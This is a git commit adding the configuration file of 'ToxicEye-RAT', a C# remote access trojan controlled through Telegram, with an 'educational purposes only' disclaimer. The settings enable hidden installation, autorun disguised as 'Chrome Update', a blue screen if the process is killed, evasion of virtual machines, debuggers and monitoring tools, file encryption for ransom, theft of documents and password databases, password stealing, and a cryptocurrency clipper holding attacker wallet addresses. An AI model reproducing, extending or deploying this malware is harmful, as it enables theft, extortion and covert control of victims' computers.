ab3e84f9b74d2d319c766b4cc59ef85b6b743e98
turalaliev <tahmazovatahira@gmail.com>
2020-06-27 19:10:26 -0400

    Telegram Rat

---
+++ TelegramRAT/config.cs
@@ -0,0 +1,71 @@
+﻿/* 
+       ^ Author    : LimerBoy
+       ^ Name      : ToxicEye-RAT
+       ^ Github    : https:github.com/Turalaliev
+
+       > This program is distributed for educational purposes only.
+*/
+
+
+namespace TelegramRAT
+{
+    internal sealed class config
+    {
+        // Telegram settings.
+        public const string TelegramToken = "TELEGRAM_TOKEN_HERE";
+        public const string TelegramChatID = "TELEGRAM_CHAT_ID_HERE";
+        public static int TelegramCommandCheckDelay = 1;
+        // Installation to system.
+        public static bool AdminRightsRequired = true;
+        public static bool AttributeHiddenEnabled = true;
+        public static bool AttributeSystemEnabled = true;
+        public static bool MeltFileAfterStart = true;
+        public static string InstallPath = @"C:\Users\ToxicEye\rat.exe";
+        // Add to startup.
+        public static bool AutorunEnabled = true;
+        public static string AutorunName = "Chrome Update";
+        // Protect process with BSoD (if killed).
+        public static bool ProcessBSODProtectionEnabled = true;
+        // Hide console window. Need for debugging.
+        public static bool HideConsoleWindow = true;
+        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
+        public static bool PreventStartOnVirtualMachine = true;
+        // Start delay (in seconds).
+        public static int StartDelay = 0;
+        // The program will not make requests to telegram api if processes are running below.
+        public static bool BlockNetworkActivityWhenProcessStarted = true;
+        // Process list
+        public static string[] BlockNetworkActivityProcessList =
+        {
+            "taskmgr", "processhacker",
+            "netstat", "netmon", "tcpview", "wireshark",
+            "filemon", "regmon", "cain"
+        };
+        // Types of files to be encrypted
+        public static string[] EncryptionFileTypes =
+        {
+            ".lnk", 
+            ".png", ".jpg", ".bmp", ".psd",
+            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
+            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
+        };
+        // Maximum file size to grab (in bytes).
+        public static long GrabFileSize = 6291456;
+        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
+        public static string[] GrabFileTypes =
+        {
+            ".kdbx",
+            ".png", ".jpg", ".bmp",
+            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
+            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
+        };
+        // Automatically steal all passwords and send to chat at first start.
+        public static bool AutoStealerEnabled = false;
+        // Clipper is enabled
+        public static bool ClipperEnabled = true;
+        // Your wallet addresses
+        public static string bitcoin_address = "1DJ5VetDBuQnmDZjRHRgEiCwYwvc6PSwu8";
+        public static string etherium_address = "0x357C0541F19a7755AFbF1CCD824EE06059404238";
+        public static string monero_address = "42Pwy6Xe4mPTz3mLap7AB5Jjd9NBt1MWjiqyvEFx3Fn8Fo9cRw9aJUHE1iTXEpUbQacMNiSxYejBKFE7UdGnyEncEECJey9";
+    }
+}
